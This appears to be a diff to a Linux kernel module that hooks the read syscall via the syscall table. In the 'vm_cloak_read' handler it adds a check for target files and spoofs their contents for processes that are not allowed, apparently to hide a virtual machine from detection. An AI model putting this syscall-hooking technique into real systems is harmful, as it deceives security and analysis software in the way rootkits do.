@@ -32,11 +32,17 @@ void unhook_read(unsigned long **syscall_table) {
 asmlinkage long vm_cloak_read(const struct pt_regs *regs) {
 
     int fd;
+    asmlinkage long orig_result;
+    char fname[1024];
 
     if (!is_comm_allowed()) {
         fd = (int) regs->di;
-        get_fname_from_fd(fd);
+        if (is_fd_target_file(fd)) {
+            orig_result = kern_read(regs);
+            spoof_result((const char __user *) regs->si);
 
+            return orig_result;
+        }
     }
 
     return kern_read(regs);
